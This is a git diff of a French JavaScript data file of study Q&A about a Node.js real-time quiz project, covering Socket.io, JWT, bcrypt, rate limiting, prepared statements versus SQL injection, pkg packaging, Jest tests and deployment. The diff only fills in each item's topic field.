@@ -1,12 +1,12 @@
 export const DATA_P2 = [
-  {id:"p2_1",proj:"p2",num:1,category:`WebSocket & Socket.io`,thematique:"",question:`Qu'est-ce qu'un WebSocket ? Pourquoi l'avez-vous choisi plutôt que HTTP ?`,answer:`<p>HTTP est unidirectionnel : le client demande, le serveur répond, la connexion se ferme. Pour un quiz en temps réel, il faudrait que le client interroge le serveur toutes les 100ms (polling) — très inefficace.</p>
+  {id:"p2_1",proj:"p2",num:1,category:`WebSocket & Socket.io`,thematique:"Socket.io",question:`Qu'est-ce qu'un WebSocket ? Pourquoi l'avez-vous choisi plutôt que HTTP ?`,answer:`<p>HTTP est unidirectionnel : le client demande, le serveur répond, la connexion se ferme. Pour un quiz en temps réel, il faudrait que le client interroge le serveur toutes les 100ms (polling) — très inefficace.</p>
 <p>WebSocket établit une connexion persistante bidirectionnelle. Le serveur peut envoyer une question à tous les joueurs simultanément sans attendre qu'ils la demandent. Socket.io est une bibliothèque qui facilite l'utilisation des WebSockets.</p>
 <pre>// Serveur envoie à TOUS les joueurs en même temps
 io.to(codePartie).emit('question', { question: safeQ(question), startedAt: Date.now() });
 
 // Client reçoit instantanément
 socket.on('question', ({ question, startedAt }) =&gt; { afficherQuestion(question); });</pre>`,freq:"hot",},
-  {id:"p2_2",proj:"p2",num:2,category:`WebSocket & Socket.io`,thematique:"",question:`Comment fonctionnent les rooms (salles) dans Socket.io ?`,answer:`<p>Une room est un canal de diffusion nommé. Un client peut rejoindre une room, et le serveur peut envoyer un message à tous les membres de cette room uniquement.</p>
+  {id:"p2_2",proj:"p2",num:2,category:`WebSocket & Socket.io`,thematique:"Socket.io",question:`Comment fonctionnent les rooms (salles) dans Socket.io ?`,answer:`<p>Une room est un canal de diffusion nommé. Un client peut rejoindre une room, et le serveur peut envoyer un message à tous les membres de cette room uniquement.</p>
 <pre>// Rejoindre une salle
 socket.join(codePartie);
 
@@ -19,7 +19,7 @@ socket.to(codePartie).emit('player_joined', { name: joueur.name });
 // Envoyer à un seul socket (un seul joueur)
 io.to(socket.id).emit('join_error', { message: 'Code invalide' });</pre>
 <p>Dans votre application, chaque partie est une room identifiée par son code à 4 chiffres. Les questions, réponses et scores ne sont diffusés qu'aux joueurs de cette salle.</p>`,freq:"hot",},
-  {id:"p2_3",proj:"p2",num:3,category:`WebSocket & Socket.io`,thematique:"",question:`Qu'est-ce qu'une race condition ? Comment l'avez-vous résolue sur RJ45 ?`,answer:`<p>Une race condition (condition de course) se produit quand deux événements arrivent dans un ordre imprévu et créent un état incohérent.</p>
+  {id:"p2_3",proj:"p2",num:3,category:`WebSocket & Socket.io`,thematique:"Socket.io",question:`Qu'est-ce qu'une race condition ? Comment l'avez-vous résolue sur RJ45 ?`,answer:`<p>Une race condition (condition de course) se produit quand deux événements arrivent dans un ordre imprévu et créent un état incohérent.</p>
 <p>Sur câble RJ45, la latence est variable : une réponse envoyée 50ms avant le timeout peut arriver 50ms après que le serveur ait déjà déclenché le timeout. Résultat : <code>answer_result</code> émis deux fois, UI incohérente.</p>
 <pre>// FIX : 3 phases séparées dans le timeout serveur
 // Phase 1 : marquer answered AVANT d'émettre quoi que ce soit
@@ -32,7 +32,7 @@ pending.forEach(name =&gt; io.to(code).emit('answer_result', { ... }));
 // Phase 3 : résoudre le round une seule fois
 if (room.answered.size &gt;= room.players.length) resolveRound(code, room);</pre>
 <p>La clé : <code>room.answered.add(name)</code> en Phase 1 fait que si une réponse tardive arrive, le guard <code>if (room.answered.has(name)) return;</code> la bloque immédiatement.</p>`,freq:"hot",},
-  {id:"p2_4",proj:"p2",num:4,category:`WebSocket & Socket.io`,thematique:"",question:`Comment le timer serveur est-il synchronisé avec les clients ?`,answer:`<p>Le serveur envoie l'heure de départ (<code>startedAt = Date.now()</code>) avec chaque question. Le client calcule le temps déjà écoulé depuis ce timestamp et démarre son timer à partir du temps restant.</p>
+  {id:"p2_4",proj:"p2",num:4,category:`WebSocket & Socket.io`,thematique:"Socket.io",question:`Comment le timer serveur est-il synchronisé avec les clients ?`,answer:`<p>Le serveur envoie l'heure de départ (<code>startedAt = Date.now()</code>) avec chaque question. Le client calcule le temps déjà écoulé depuis ce timestamp et démarre son timer à partir du temps restant.</p>
 <pre>// Serveur
 io.to(code).emit('question', { question: safeQ(q), startedAt: Date.now() });
 
@@ -42,7 +42,7 @@ socket.on('question', ({ question, startedAt }) =&gt; {
     renderQuestion(question);
 });</pre>
 <p>Même si le message réseau met 200ms, tous les joueurs voient exactement le même temps restant. Le serveur impose également son propre timeout (+500ms de grâce réseau).</p>`,freq:"hot",},
-  {id:"p2_5",proj:"p2",num:5,category:`Sécurité Node.js`,thematique:"",question:`Qu'est-ce qu'un JWT et comment l'utilisez-vous ?`,answer:`<p>JWT (JSON Web Token) est un token signé qui prouve l'identité d'un utilisateur sans stocker de session côté serveur. Il contient des données (id, rôle) et une signature vérifiable.</p>
+  {id:"p2_5",proj:"p2",num:5,category:`Sécurité Node.js`,thematique:"JWT & Sécurité",question:`Qu'est-ce qu'un JWT et comment l'utilisez-vous ?`,answer:`<p>JWT (JSON Web Token) est un token signé qui prouve l'identité d'un utilisateur sans stocker de session côté serveur. Il contient des données (id, rôle) et une signature vérifiable.</p>
 <pre>// Création à la connexion
 const token = jwt.sign(
     { id: user.id, role: user.role },
@@ -58,14 +58,14 @@ function requireAuth(req, res, next) {
     next();
 }</pre>
 <p>L'administrateur reçoit le token à la connexion et l'envoie dans chaque requête (<code>Authorization: Bearer &lt;token&gt;</code>). Valide 8h — expire automatiquement.</p>`,freq:"hot",},
-  {id:"p2_6",proj:"p2",num:6,category:`Sécurité Node.js`,thematique:"",question:`Pourquoi hasher les mots de passe avec bcrypt ? Que sont les "rounds" ?`,answer:`<p>Si la base de données est volée, les mots de passe ne doivent pas être lisibles. bcrypt transforme le mot de passe en une valeur irréversible. Même avec le hash, on ne peut pas retrouver le mot de passe d'origine.</p>
+  {id:"p2_6",proj:"p2",num:6,category:`Sécurité Node.js`,thematique:"JWT & Sécurité",question:`Pourquoi hasher les mots de passe avec bcrypt ? Que sont les "rounds" ?`,answer:`<p>Si la base de données est volée, les mots de passe ne doivent pas être lisibles. bcrypt transforme le mot de passe en une valeur irréversible. Même avec le hash, on ne peut pas retrouver le mot de passe d'origine.</p>
 <pre>// Enregistrement : hash avant stockage
 const hash = await bcrypt.hash(motDePasse, 12);  // 12 rounds
 
 // Vérification à la connexion
 const ok = await bcrypt.compare(motDePasseSaisi, hashEnBase);</pre>
 <p>Les "rounds" (12 dans votre cas) définissent le nombre d'itérations de l'algorithme. Plus il y en a, plus le calcul est lent — ce qui décourage les attaques par force brute (chercher parmi des millions de mots de passe).</p>`,freq:"hot",},
-  {id:"p2_7",proj:"p2",num:7,category:`Sécurité Node.js`,thematique:"",question:`Qu'est-ce que le rate limiting et pourquoi l'avez-vous appliqué à deux niveaux ?`,answer:`<p>Le rate limiting limite le nombre de requêtes qu'une IP peut envoyer sur une période donnée. Il protège contre les attaques par force brute et le flood.</p>
+  {id:"p2_7",proj:"p2",num:7,category:`Sécurité Node.js`,thematique:"JWT & Sécurité",question:`Qu'est-ce que le rate limiting et pourquoi l'avez-vous appliqué à deux niveaux ?`,answer:`<p>Le rate limiting limite le nombre de requêtes qu'une IP peut envoyer sur une période donnée. Il protège contre les attaques par force brute et le flood.</p>
 <pre>// Niveau 1 : route de login (très strict)
 const loginLimiter = rateLimit({
     windowMs: 15 * 60 * 1000,  // 15 minutes
@@ -81,7 +81,7 @@ socket.on('answer', (data) =&gt; {
     // ... traitement
 });</pre>
 <p>Le premier protège les admins contre le brute force. Le second empêche un joueur malveillant d'inonder le serveur d'événements pour le saturer.</p>`,freq:"med",},
-  {id:"p2_8",proj:"p2",num:8,category:`Sécurité Node.js`,thematique:"",question:`Pourquoi la fonction <code>safeQ()</code> est-elle critique pour la sécurité ?`,answer:`<p>La bonne réponse (<code>_answer</code>) est stockée dans l'objet question côté serveur. Si elle était envoyée au client, n'importe quel joueur pourrait la lire dans les outils de développement du navigateur et tricher.</p>
+  {id:"p2_8",proj:"p2",num:8,category:`Sécurité Node.js`,thematique:"JWT & Sécurité",question:`Pourquoi la fonction <code>safeQ()</code> est-elle critique pour la sécurité ?`,answer:`<p>La bonne réponse (<code>_answer</code>) est stockée dans l'objet question côté serveur. Si elle était envoyée au client, n'importe quel joueur pourrait la lire dans les outils de développement du navigateur et tricher.</p>
 <pre>function safeQ(questionAvecReponse) {
     // Destructuring : retire _answer, garde tout le reste
     const { _answer, ...questionSansPousse } = questionAvecReponse;
@@ -90,7 +90,7 @@ socket.on('answer', (data) =&gt; {
 
 // Utilisation obligatoire avant tout emit
 io.to(code).emit('question', { question: safeQ(q), startedAt: Date.now() });</pre>`,freq:"hot",},
-  {id:"p2_9",proj:"p2",num:9,category:`Base de données & API`,thematique:"",question:`Pourquoi des requêtes préparées plutôt que du SQL dynamique ?`,answer:`<p>Une requête dynamique construit le SQL en concaténant des chaînes — dangereuse si les valeurs viennent de l'utilisateur (injection SQL). Une requête préparée sépare le SQL des données.</p>
+  {id:"p2_9",proj:"p2",num:9,category:`Base de données & API`,thematique:"SQLite",question:`Pourquoi des requêtes préparées plutôt que du SQL dynamique ?`,answer:`<p>Une requête dynamique construit le SQL en concaténant des chaînes — dangereuse si les valeurs viennent de l'utilisateur (injection SQL). Une requête préparée sépare le SQL des données.</p>
 <pre>// ❌ DANGEREUX — injection SQL possible
 db.exec(\`SELECT * FROM questions WHERE category = '\${req.body.cat}'\`);
 
@@ -99,7 +99,7 @@ const stmt = db.prepare('SELECT * FROM questions WHERE category = ?');
 // Lors de chaque appel :
 const questions = stmt.all(req.body.cat);  // Valeur toujours traitée comme texte</pre>
 <p>Dans votre projet, TOUTES les requêtes sont préparées dans <code>src/db/statements.js</code> au démarrage. Elles sont compilées une fois et réutilisées — plus rapide et 100% protégées.</p>`,freq:"hot",},
-  {id:"p2_10",proj:"p2",num:10,category:`Base de données & API`,thematique:"",question:`Qu'est-ce qu'une API REST ? Comment avez-vous structuré la vôtre ?`,answer:`<p>Une API REST utilise les verbes HTTP pour définir les actions : GET (lire), POST (créer), PUT (modifier), DELETE (supprimer). L'URL identifie la ressource, le verbe l'action.</p>
+  {id:"p2_10",proj:"p2",num:10,category:`Base de données & API`,thematique:"SQLite",question:`Qu'est-ce qu'une API REST ? Comment avez-vous structuré la vôtre ?`,answer:`<p>Une API REST utilise les verbes HTTP pour définir les actions : GET (lire), POST (créer), PUT (modifier), DELETE (supprimer). L'URL identifie la ressource, le verbe l'action.</p>
 <pre>GET    /api/v1/quiz?difficulty=normal  → Liste questions filtrées
 POST   /api/v1/quiz                   → Créer une question (auth requise)
 PUT    /api/v1/quiz/:id               → Modifier une question (auth)
@@ -108,7 +108,7 @@ POST   /api/v1/auth/login             → Connexion admin → JWT
 GET    /api/v1/admin/settings         → Lire les paramètres (auth)
 PUT    /api/v1/admin/settings         → Modifier les paramètres (auth)</pre>
 <p>6 routeurs Express organisés sous <code>/api/v1/</code> pour le versionnage.</p>`,freq:"easy",},
-  {id:"p2_11",proj:"p2",num:11,category:`Architecture front-end`,thematique:"",question:`Pourquoi avez-vous refactorisé le code en 7 modules ES ?`,answer:`<p>Le fichier initial faisait 1449 lignes. Un fichier unique :</p>
+  {id:"p2_11",proj:"p2",num:11,category:`Architecture front-end`,thematique:"Node.js",question:`Pourquoi avez-vous refactorisé le code en 7 modules ES ?`,answer:`<p>Le fichier initial faisait 1449 lignes. Un fichier unique :</p>
 <ul style="padding-left:1rem;margin:8px 0;line-height:1.8">
 <li>Est difficile à lire : on ne sait plus "où est quoi"</li>
 <li>Génère des conflits Git quand plusieurs personnes travaillent dessus</li>
@@ -118,7 +118,7 @@ PUT    /api/v1/admin/settings         → Modifier les paramètres (auth)</pre>
         — Chaque module a une responsabilité unique (SRP)<br/>
         — On peut modifier <code>mp-grid.js</code> sans toucher à <code>mp-game.js</code><br/>
         — Les tests Jest peuvent importer et tester chaque fonction indépendamment</p>`,freq:"hot",},
-  {id:"p2_12",proj:"p2",num:12,category:`Architecture front-end`,thematique:"",question:`Qu'est-ce que la délégation d'événements ? Comment a-t-elle corrigé le bug apostrophe ?`,answer:`<p>La délégation d'événements : au lieu de mettre un listener sur chaque bouton, on en met un seul sur le parent. Le listener vérifie quel élément a déclenché l'événement.</p>
+  {id:"p2_12",proj:"p2",num:12,category:`Architecture front-end`,thematique:"Node.js",question:`Qu'est-ce que la délégation d'événements ? Comment a-t-elle corrigé le bug apostrophe ?`,answer:`<p>La délégation d'événements : au lieu de mettre un listener sur chaque bouton, on en met un seul sur le parent. Le listener vérifie quel élément a déclenché l'événement.</p>
 <pre>// ❌ AVANT (inline) — bug sur L'île, L'ours, D'accord...
 btn.innerHTML = \`&lt;button onclick="handleAnswer('\${answer}')"&gt;L'île&lt;/button&gt;\`;
 // → SyntaxError : handleAnswer('L'île') — l'apostrophe ferme la chaîne !
@@ -130,7 +130,7 @@ document.addEventListener('click', e =&gt; {
     if (btn) window.handleAnswer(btn.dataset.answer);  // Lu depuis l'attribut
 });</pre>
 <p>La valeur est stockée dans <code>data-answer</code> et lue via <code>.dataset.answer</code> — jamais interpolée dans du code JavaScript.</p>`,freq:"hot",},
-  {id:"p2_13",proj:"p2",num:13,category:`pkg & Déploiement`,thematique:"",question:`Expliquez-moi pkg — qu'est-ce que c'est et pourquoi l'avez-vous utilisé ?`,answer:`<p><b>Le problème de départ</b> : pour lancer le quiz normalement, un animateur non-développeur devrait installer Node.js, télécharger le code, faire <code>npm install</code> puis <code>npm start</code>. C'est beaucoup trop compliqué.</p>
+  {id:"p2_13",proj:"p2",num:13,category:`pkg & Déploiement`,thematique:"pkg (Vercel)",question:`Expliquez-moi pkg — qu'est-ce que c'est et pourquoi l'avez-vous utilisé ?`,answer:`<p><b>Le problème de départ</b> : pour lancer le quiz normalement, un animateur non-développeur devrait installer Node.js, télécharger le code, faire <code>npm install</code> puis <code>npm start</code>. C'est beaucoup trop compliqué.</p>
 <p><b>Ce que fait pkg</b> : c'est un outil créé par Vercel (la société derrière Next.js) qui conditionne toute l'application dans un seul fichier exécutable autonome. Ce fichier contient à l'intérieur :</p>
 <ul style="padding-left:1rem;margin:8px 0;line-height:1.8">
 <li>Le moteur Node.js lui-même</li>
@@ -146,7 +146,7 @@ document.addEventListener('click', e =&gt; {
 <p>Résultat : l'animateur reçoit un fichier <code>QuizzFinal-win.exe</code>, il double-clique dessus, le navigateur s'ouvre sur <code>http://localhost:3001</code>. Aucune installation de quoi que ce soit.</p>
 <p><b>La subtilité de la base de données</b> : la base SQLite ne peut pas être enfermée à l'intérieur du binaire car elle doit être modifiable (on y écrit des scores). Au premier lancement, pkg crée automatiquement le fichier <code>quizz.db</code> <em>à côté</em> de l'exécutable, sur le vrai disque dur. Les données persistent entre les redémarrages.</p>
 <p><b>Pourquoi "Vercel" dans le nom ?</b> pkg a été développé par Vercel et mis à disposition gratuitement. Ce n'est pas leur produit principal — Vercel est surtout connu pour héberger des sites web — mais ils ont créé cet outil pour la communauté Node.js. Quand on dit "pkg (Vercel)" c'est comme dire "Jest (Meta)" ou "TypeScript (Microsoft)" : ça précise juste qui l'a fait.</p>`,freq:"hot",},
-  {id:"p2_14",proj:"p2",num:14,category:`pkg & Déploiement`,thematique:"",question:`Pourquoi better-sqlite3 pose-t-il un problème sous pkg et comment l'avez-vous résolu ?`,answer:`<p>better-sqlite3 contient un module natif (<code>.node</code>) — un binaire compilé en C++. pkg embarque les fichiers JS dans un "snapshot" virtuel, mais les binaires C++ ne peuvent pas s'exécuter depuis ce snapshot : ils doivent être sur le vrai système de fichiers.</p>
+  {id:"p2_14",proj:"p2",num:14,category:`pkg & Déploiement`,thematique:"pkg (Vercel)",question:`Pourquoi better-sqlite3 pose-t-il un problème sous pkg et comment l'avez-vous résolu ?`,answer:`<p>better-sqlite3 contient un module natif (<code>.node</code>) — un binaire compilé en C++. pkg embarque les fichiers JS dans un "snapshot" virtuel, mais les binaires C++ ne peuvent pas s'exécuter depuis ce snapshot : ils doivent être sur le vrai système de fichiers.</p>
 <pre>if (IS_PKG) {
     // 1. Définir le dossier de destination dans /tmp/
     const dstNode = path.join(os.tmpdir(), 'quizz-native', 'better_sqlite3.node');
@@ -159,7 +159,7 @@ document.addEventListener('click', e =&gt; {
         req.endsWith('.node') ? dstNode : _original(req, ...args);
 }</pre>
 <p>Au premier lancement, le binaire est extrait vers <code>/tmp/quizz-native/</code>. Les lancements suivants le réutilisent. Si l'exe est mis à jour (taille différente), le binaire est re-copié.</p>`,freq:"med",},
-  {id:"p2_15",proj:"p2",num:15,category:`Tests Jest`,thematique:"",question:`Qu'est-ce que Jest et comment avez-vous atteint 100% de couverture ?`,answer:`<p>Jest est un framework de tests JavaScript. Il exécute vos tests, vérifie les résultats avec <code>expect()</code> et génère un rapport de couverture (quelles lignes sont exécutées par les tests).</p>
+  {id:"p2_15",proj:"p2",num:15,category:`Tests Jest`,thematique:"Tests",question:`Qu'est-ce que Jest et comment avez-vous atteint 100% de couverture ?`,answer:`<p>Jest est un framework de tests JavaScript. Il exécute vos tests, vérifie les résultats avec <code>expect()</code> et génère un rapport de couverture (quelles lignes sont exécutées par les tests).</p>
 <pre>// tests/game.test.js
 describe('calcScore()', () =&gt; {
     test('bonne réponse instantanée = 2000 pts', () =&gt; {
@@ -173,7 +173,7 @@ describe('calcScore()', () =&gt; {
     });
 });</pre>
 <p>100% de couverture = chaque ligne et chaque branche (if/else) de la fonction est exécutée par au moins un test. On atteint ça en couvrant : le cas nominal, les cas limites (0, max), et les cas d'erreur (timeout, valeur manquante).</p>`,freq:"med",},
-  {id:"p2_16",proj:"p2",num:16,category:`Tests Jest`,thematique:"",question:`Qu'est-ce que Supertest et à quoi sert-il dans vos tests de routes ?`,answer:`<p>Supertest simule des requêtes HTTP vers votre serveur Express sans démarrer un vrai serveur réseau. Il permet de tester les routes API comme si on envoyait de vraies requêtes.</p>
+  {id:"p2_16",proj:"p2",num:16,category:`Tests Jest`,thematique:"Tests",question:`Qu'est-ce que Supertest et à quoi sert-il dans vos tests de routes ?`,answer:`<p>Supertest simule des requêtes HTTP vers votre serveur Express sans démarrer un vrai serveur réseau. Il permet de tester les routes API comme si on envoyait de vraies requêtes.</p>
 <pre>const request = require('supertest');
 const app = require('../server');
 
@@ -187,21 +187,21 @@ test('POST /api/v1/quiz sans auth → 401', async () =&gt; {
     const res = await request(app).post('/api/v1/quiz').send({ question: 'Test' });
     expect(res.status).toBe(401);
 });</pre>`,freq:"med",},
-  {id:"p2_17",proj:"p2",num:17,category:`Questions générales`,thematique:"",question:`Quelle est la différence entre HTTP et HTTPS ?`,answer:`<p>HTTP transmet les données en clair — n'importe qui sur le réseau peut les lire (attaque man-in-the-middle). HTTPS chiffre les données via TLS/SSL — même interceptées, elles sont illisibles sans la clé privée.</p>
+  {id:"p2_17",proj:"p2",num:17,category:`Questions générales`,thematique:"Node.js",question:`Quelle est la différence entre HTTP et HTTPS ?`,answer:`<p>HTTP transmet les données en clair — n'importe qui sur le réseau peut les lire (attaque man-in-the-middle). HTTPS chiffre les données via TLS/SSL — même interceptées, elles sont illisibles sans la clé privée.</p>
 <p>Pour votre application multijoueur en réseau local, HTTPS n'est pas obligatoire (réseau interne). En déploiement public, il serait activé via Nginx + Certbot (Let's Encrypt) — certificat gratuit.</p>`,freq:"easy",},
-  {id:"p2_18",proj:"p2",num:18,category:`Questions générales`,thematique:"",question:`Qu'est-ce que Helmet.js et quels headers de sécurité active-t-il ?`,answer:`<p>Helmet.js est un middleware Express qui ajoute automatiquement des headers HTTP de sécurité à chaque réponse.</p>
+  {id:"p2_18",proj:"p2",num:18,category:`Questions générales`,thematique:"Node.js",question:`Qu'est-ce que Helmet.js et quels headers de sécurité active-t-il ?`,answer:`<p>Helmet.js est un middleware Express qui ajoute automatiquement des headers HTTP de sécurité à chaque réponse.</p>
 <pre>app.use(helmet());</pre>
 <p>Headers activés :<br/>
         — <code>X-Content-Type-Options: nosniff</code> → empêche le navigateur de "deviner" le type MIME<br/>
         — <code>X-Frame-Options: SAMEORIGIN</code> → empêche l'intégration dans une iframe externe (anti-clickjacking)<br/>
         — <code>Referrer-Policy: no-referrer</code> → ne transmet pas l'URL de provenance aux sites tiers<br/>
         — <code>X-XSS-Protection</code> → active la protection XSS du navigateur</p>`,freq:"med",},
-  {id:"p2_19",proj:"p2",num:19,category:`Questions générales`,thematique:"",question:`Qu'est-ce que le CORS et pourquoi est-ce acceptable d'avoir <code>*</code> en réseau local ?`,answer:`<p>CORS (Cross-Origin Resource Sharing) est une politique de sécurité des navigateurs : par défaut, une page web ne peut faire des requêtes qu'au même serveur. Pour autoriser d'autres origines, le serveur doit le déclarer.</p>
+  {id:"p2_19",proj:"p2",num:19,category:`Questions générales`,thematique:"Node.js",question:`Qu'est-ce que le CORS et pourquoi est-ce acceptable d'avoir <code>*</code> en réseau local ?`,answer:`<p>CORS (Cross-Origin Resource Sharing) est une politique de sécurité des navigateurs : par défaut, une page web ne peut faire des requêtes qu'au même serveur. Pour autoriser d'autres origines, le serveur doit le déclarer.</p>
 <p>En réseau local, les joueurs accèdent au serveur via son IP (<code>http://192.168.1.x:3001</code>) depuis différents navigateurs. Le <code>*</code> (toutes origines) est acceptable ici car :<br/>
         — Réseau local fermé, sans accès internet<br/>
         — Pas de données sensibles exposées aux joueurs<br/>
         — En déploiement public, on remplacerait <code>*</code> par l'URL exacte du domaine</p>`,freq:"easy",},
-  {id:"p2_20",proj:"p2",num:20,category:`Questions générales`,thematique:"",question:`Comment avez-vous géré la persistance des données avec pkg ?`,answer:`<p>Le snapshot pkg est en lecture seule : on ne peut pas écrire dans la base de données SQLite si elle est embarquée dans le binaire. La base doit être sur le vrai système de fichiers, à côté de l'exécutable.</p>
+  {id:"p2_20",proj:"p2",num:20,category:`Questions générales`,thematique:"Node.js",question:`Comment avez-vous géré la persistance des données avec pkg ?`,answer:`<p>Le snapshot pkg est en lecture seule : on ne peut pas écrire dans la base de données SQLite si elle est embarquée dans le binaire. La base doit être sur le vrai système de fichiers, à côté de l'exécutable.</p>
 <pre>function dataPath(filename) {
     if (IS_PKG) {
         // process.execPath = chemin de l'exe
@@ -212,7 +212,7 @@ test('POST /api/v1/quiz sans auth → 401', async () =&gt; {
     return path.join(__dirname, '..', '..', 'data', filename);
 }</pre>
 <p>Résultat : <code>data/quizz.db</code> est créé à côté de l'exe au premier lancement et persiste entre les redémarrages. Les questions et scores sont conservés.</p>`,freq:"med",},
-  {id:"p2_21",proj:"p2",num:21,category:`Questions générales`,thematique:"",question:`Qu'est-ce qu'un middleware Express ?`,answer:`<p>Un middleware est une fonction qui s'exécute entre la réception de la requête et l'envoi de la réponse. Il peut modifier la requête, la réponse, ou interrompre le traitement.</p>
+  {id:"p2_21",proj:"p2",num:21,category:`Questions générales`,thematique:"Node.js",question:`Qu'est-ce qu'un middleware Express ?`,answer:`<p>Un middleware est une fonction qui s'exécute entre la réception de la requête et l'envoi de la réponse. Il peut modifier la requête, la réponse, ou interrompre le traitement.</p>
 <pre>// Middleware d'authentification
 function requireAuth(req, res, next) {
     const token = req.headers.authorization?.split(' ')[1];
@@ -227,13 +227,13 @@ function requireAuth(req, res, next) {
 
 // Utilisation sur une route
 app.put('/api/v1/admin/settings', requireAuth, updateSettings);</pre>`,freq:"easy",},
-  {id:"p2_22",proj:"p2",num:22,category:`Questions générales`,thematique:"",question:`Qu'est-ce qu'un service systemd et pourquoi l'utilisez-vous ?`,answer:`<p>systemd est le gestionnaire de services d'Ubuntu. Un service systemd démarre automatiquement au boot, redémarre en cas de crash, et peut être contrôlé facilement.</p>
+  {id:"p2_22",proj:"p2",num:22,category:`Questions générales`,thematique:"Node.js",question:`Qu'est-ce qu'un service systemd et pourquoi l'utilisez-vous ?`,answer:`<p>systemd est le gestionnaire de services d'Ubuntu. Un service systemd démarre automatiquement au boot, redémarre en cas de crash, et peut être contrôlé facilement.</p>
 <pre>sudo systemctl enable --now quizz    # Démarrer + activer au boot
 sudo systemctl restart quizz         # Redémarrer (après déploiement)
 sudo systemctl stop quizz            # Arrêter
 sudo journalctl -u quizz -f          # Voir les logs en temps réel</pre>
 <p>Sans systemd, si le serveur redémarre ou si Node.js plante, l'application reste arrêtée. Avec systemd, elle repart automatiquement sans intervention manuelle.</p>`,freq:"easy",},
-  {id:"p2_23",proj:"p2",num:23,category:`Questions générales`,thematique:"",question:`Comment fonctionnent les variables d'environnement et pourquoi ne pas hardcoder les secrets ?`,answer:`<p>Les variables d'environnement sont des valeurs externes injectées au lancement de l'application, lues via <code>process.env.NOM_VARIABLE</code>. Elles permettent de configurer l'application différemment selon l'environnement (dev/prod) sans modifier le code.</p>
+  {id:"p2_23",proj:"p2",num:23,category:`Questions générales`,thematique:"Node.js",question:`Comment fonctionnent les variables d'environnement et pourquoi ne pas hardcoder les secrets ?`,answer:`<p>Les variables d'environnement sont des valeurs externes injectées au lancement de l'application, lues via <code>process.env.NOM_VARIABLE</code>. Elles permettent de configurer l'application différemment selon l'environnement (dev/prod) sans modifier le code.</p>
 <pre># .env (non versionné dans Git)
 JWT_SECRET=mon_secret_tres_long_et_aleatoire_32chars
 PORT=3001
@@ -243,11 +243,11 @@ NODE_ENV=production
 const secret = process.env.JWT_SECRET;
 if (!secret) console.warn('[WARN] JWT_SECRET absent — utilisation du secret par défaut !');</pre>
 <p>Si <code>JWT_SECRET</code> est écrit directement dans le code et commitée dans Git, n'importe qui avec accès au dépôt peut forger des tokens admin.</p>`,freq:"easy",},
-  {id:"p2_24",proj:"p2",num:24,category:`Questions générales`,thematique:"",question:`Qu'est-ce que la compression gzip et pourquoi l'avez-vous activée ?`,answer:`<p>La compression gzip réduit la taille des réponses HTTP (fichiers CSS, JS, JSON) avant de les envoyer au client. Le navigateur les décompresse automatiquement.</p>
+  {id:"p2_24",proj:"p2",num:24,category:`Questions générales`,thematique:"Node.js",question:`Qu'est-ce que la compression gzip et pourquoi l'avez-vous activée ?`,answer:`<p>La compression gzip réduit la taille des réponses HTTP (fichiers CSS, JS, JSON) avant de les envoyer au client. Le navigateur les décompresse automatiquement.</p>
 <pre>const compression = require('compression');
 app.use(compression());  // Active gzip sur toutes les réponses</pre>
 <p>Un fichier CSS de 50 Ko peut être réduit à 10 Ko en gzip. Sur un réseau Wi-Fi local, cela accélère le chargement initial, notamment pour les participants qui se connectent simultanément au début d'une session.</p>`,freq:"easy",},
-  {id:"p2_25",proj:"p2",num:25,category:`Node.js — Fondamentaux`,thematique:"",question:`Qu'est-ce que Node.js et en quoi est-il différent du JavaScript navigateur ?`,answer:`<p>Node.js est un environnement d'exécution JavaScript côté serveur, basé sur le moteur V8 de Chrome. Il permet de faire tourner du JavaScript en dehors du navigateur : sur un serveur, un terminal ou un ordinateur.</p>
+  {id:"p2_25",proj:"p2",num:25,category:`Node.js — Fondamentaux`,thematique:"Node.js",question:`Qu'est-ce que Node.js et en quoi est-il différent du JavaScript navigateur ?`,answer:`<p>Node.js est un environnement d'exécution JavaScript côté serveur, basé sur le moteur V8 de Chrome. Il permet de faire tourner du JavaScript en dehors du navigateur : sur un serveur, un terminal ou un ordinateur.</p>
 <p>Différences clés :</p>
 <ul style="padding-left:1rem;margin:8px 0;line-height:1.8">
 <li><b>Navigateur</b> : accès au DOM (<code>document</code>, <code>window</code>), pas d'accès aux fichiers</li>
@@ -260,7 +260,7 @@ const contenu = fs.readFileSync('data/quizz.db');
 // Côté navigateur — accéder au DOM (impossible dans Node.js)
 document.getElementById('score').textContent = '1000';</pre>
 <p>Dans votre projet, Node.js fait tourner le serveur Express, gère la base SQLite et les WebSockets. Le navigateur des joueurs exécute uniquement les fichiers JS de <code>public/js/</code>.</p>`,freq:"hot",},
-  {id:"p2_26",proj:"p2",num:26,category:`Node.js — Fondamentaux`,thematique:"",question:`Qu'est-ce que la boucle d'événements (event loop) de Node.js ?`,answer:`<p>Node.js est mono-thread : il n'exécute qu'une seule chose à la fois. La boucle d'événements lui permet quand même de gérer plusieurs requêtes simultanément en ne bloquant jamais sur les opérations lentes (réseau, fichiers) — il délègue ces opérations et reprend la main dès que le résultat est prêt.</p>
+  {id:"p2_26",proj:"p2",num:26,category:`Node.js — Fondamentaux`,thematique:"Node.js",question:`Qu'est-ce que la boucle d'événements (event loop) de Node.js ?`,answer:`<p>Node.js est mono-thread : il n'exécute qu'une seule chose à la fois. La boucle d'événements lui permet quand même de gérer plusieurs requêtes simultanément en ne bloquant jamais sur les opérations lentes (réseau, fichiers) — il délègue ces opérations et reprend la main dès que le résultat est prêt.</p>
 <pre>// ❌ Bloquant : Node.js ne peut rien faire d'autre pendant ce calcul
 const result = fs.readFileSync('gros-fichier.txt'); // Attend ici
 
@@ -272,7 +272,7 @@ fs.readFile('gros-fichier.txt', (err, data) =&gt; {
 // Node.js exécute d'autres choses ici pendant la lecture</pre>
 <p>C'est pour ça que Node.js est très efficace pour les serveurs : il peut gérer des centaines de connexions Socket.io en même temps avec un seul thread, tant que le code n'est pas bloquant.</p>
 <p><b>Dans votre projet</b> : <code>better-sqlite3</code> est synchrone (bloquant), ce qui est acceptable car les requêtes SQLite sont très rapides (&lt;1ms). Les opérations réseau Socket.io, elles, sont toutes asynchrones.</p>`,freq:"hot",},
-  {id:"p2_27",proj:"p2",num:27,category:`Node.js — Fondamentaux`,thematique:"",question:`Qu'est-ce que npm et à quoi sert le fichier <code>package.json</code> ?`,answer:`<p>npm (Node Package Manager) est le gestionnaire de paquets de Node.js. Il permet d'installer des bibliothèques tierces (Express, Socket.io, etc.) et de définir des scripts de lancement.</p>
